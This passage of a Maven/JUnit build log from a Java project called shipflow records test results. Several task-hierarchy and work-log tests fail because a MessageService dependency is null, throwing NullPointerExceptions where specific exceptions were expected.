	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.002 s -- in com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$EdgeCasesTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$EvaluationTests
[INFO] Tests run: 23, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.037 s -- in com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$EvaluationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$FieldReferenceTests
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$FieldReferenceTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$ValidFieldReferenceTests
[INFO] Tests run: 20, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.007 s -- in com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$ValidFieldReferenceTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$ValidationTests
[INFO] Tests run: 14, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$ValidationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$WhereClauseTests
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$WhereClauseTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.053 s -- in com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest
[ERROR] Tests run: 10, Failures: 3, Errors: 0, Skipped: 0, Time elapsed: 0.006 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.shouldFailToCreateTaskWithParentFromDifferentCycle -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.createTask(TaskService.java:139)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.lambda$shouldFailToCreateTaskWithParentFromDifferentCycle$1(TaskHierarchyServiceTest.java:168)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.shouldFailToCreateTaskWithParentFromDifferentCycle(TaskHierarchyServiceTest.java:169)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.shouldPreventTaskFromBeingItsOwnParent -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.updateTask(TaskService.java:224)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.lambda$shouldPreventTaskFromBeingItsOwnParent$3(TaskHierarchyServiceTest.java:336)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.shouldPreventTaskFromBeingItsOwnParent(TaskHierarchyServiceTest.java:337)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.shouldPreventCircularReferenceWhenUpdating -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.updateTask(TaskService.java:224)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.lambda$shouldPreventCircularReferenceWhenUpdating$2(TaskHierarchyServiceTest.java:323)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.shouldPreventCircularReferenceWhenUpdating(TaskHierarchyServiceTest.java:324)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.PitchServiceTest
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.005 s -- in com.github.farzadsedaghatbin.shipflow.service.PitchServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.PitchHealthServiceTest
[INFO] Tests run: 11, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.007 s -- in com.github.farzadsedaghatbin.shipflow.service.PitchHealthServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest
[ERROR] Tests run: 10, Failures: 3, Errors: 0, Skipped: 0, Time elapsed: 0.007 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.deleteMyWorkLog_WhenNotOwned_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "only delete your own work logs"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.deleteMyWorkLog(WorkLogService.java:326)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.lambda$deleteMyWorkLog_WhenNotOwned_ShouldThrowException$2(MyWorkLogServiceTest.java:264)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.deleteMyWorkLog_WhenNotOwned_ShouldThrowException(MyWorkLogServiceTest.java:264)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.deleteMyWorkLog_WhenNotOwned_ShouldThrowException(MyWorkLogServiceTest.java:266)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.createMyWorkLog_WhenUserNotLinkedToPerson_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "not linked to a person profile"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.getCurrentUserPerson(WorkLogService.java:189)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.createMyWorkLog(WorkLogService.java:238)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.lambda$createMyWorkLog_WhenUserNotLinkedToPerson_ShouldThrowException$0(MyWorkLogServiceTest.java:206)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.createMyWorkLog_WhenUserNotLinkedToPerson_ShouldThrowException(MyWorkLogServiceTest.java:206)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.createMyWorkLog_WhenUserNotLinkedToPerson_ShouldThrowException(MyWorkLogServiceTest.java:208)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.updateMyWorkLog_WhenNotOwned_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "only update your own work logs"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
